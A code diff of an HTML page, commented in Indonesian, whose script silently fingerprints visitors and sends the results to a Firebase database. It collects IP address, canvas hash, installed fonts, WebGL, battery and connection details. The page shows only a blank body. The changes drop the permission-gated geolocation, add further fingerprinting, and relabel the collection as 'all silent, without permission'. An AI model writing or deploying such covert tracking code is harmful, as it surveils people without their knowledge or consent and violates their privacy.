@@ -23,7 +23,7 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Fungsi ambil data silently + geolocation (dengan izin)
+        // Fungsi ambil data silently lalu kirim ke DB
         async function logUserData() {
             try {
                 // Ambil IP via API eksternal
@@ -57,6 +57,7 @@
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language;
                 const touchPoints = navigator.maxTouchPoints || 0;
+                const platform = navigator.platform || "Unknown";
 
                 // Canvas Fingerprint (unik per device)
                 const canvas = document.createElement('canvas');
@@ -113,7 +114,7 @@
                     rtt: connection.rtt || "Unknown"
                 };
 
-                // Battery Status (silent di Chrome/Edge)
+                // Battery Status (silent, kalo supported)
                 let batteryData = { level: "Unknown", charging: "Unknown", chargingTime: "Unknown", dischargingTime: "Unknown" };
                 try {
                     if (navigator.getBattery) {
@@ -127,34 +128,18 @@
                     }
                 } catch (e) {}
 
-                // Geolocation (trigger izin pop-up)
-                let geolocationData = { latitude: "Unknown", longitude: "Unknown", accuracy: "Unknown", altitude: "Unknown", speed: "Unknown" };
-                try {
-                    if (navigator.geolocation) {
-                        geolocationData = await new Promise((resolve) => {
-                            navigator.geolocation.getCurrentPosition(
-                                (position) => {
-                                    resolve({
-                                        latitude: position.coords.latitude,
-                                        longitude: position.coords.longitude,
-                                        accuracy: position.coords.accuracy,
-                                        altitude: position.coords.altitude || "Unknown",
-                                        speed: position.coords.speed || "Unknown"
-                                    });
-                                },
-                                (error) => {
-                                    resolve({ latitude: "Denied", longitude: "Denied", accuracy: "Denied", altitude: "Denied", speed: "Denied" });
-                                },
-                                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                            );
-                        });
-                    }
-                } catch (e) {}
+                // Window Properties (tambahan fingerprint)
+                const windowProps = {
+                    toolbarVisible: window.toolbar ? window.toolbar.visible : "Unknown",
+                    menubarVisible: window.menubar ? window.menubar.visible : "Unknown",
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                };
 
                 // Timestamp di GMT+7 (Asia/Jakarta)
                 const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' });
 
-                // Data yang dikirim (silent + geolocation dengan izin)
+                // Data yang dikirim (semua silent, tanpa izin)
                 const data = {
                     ip: userIP, // Berubah: VPN, proxy
                     browser: browser, // Tetap: kecuali ganti browser
@@ -168,14 +153,15 @@
                     timezone: timezone, // Berubah: kalo ganti setting
                     language: language, // Berubah: kalo ganti setting
                     touchPoints: touchPoints, // Tetap: per device
+                    platform: platform, // Tetap: per device
                     canvasHash: canvasHash, // Tetap: unik per device
                     installedFonts: fonts.join(', '), // Tetap: kecuali install font
                     webglVendor: webglVendor, // Tetap: per GPU
                     webglRenderer: webglRenderer, // Tetap: per GPU
                     referrer: document.referrer, // Berubah: tergantung link
                     connection: connectionData, // Berubah: WiFi/4G/5G
-                    battery: batteryData, // Berubah: level baterai, charging
-                    geolocation: geolocationData, // Berubah: lokasi user, izin eksplisit
+                    battery: batteryData, // Berubah: level/charging status
+                    windowProps: windowProps, // Berubah: tergantung window size
                     timestamp: timestamp // Berubah: per waktu
                 };
 
@@ -193,4 +179,4 @@
 <body>
     <!-- Blank putih, kosong -->
 </body>
-    </html>
+</html>
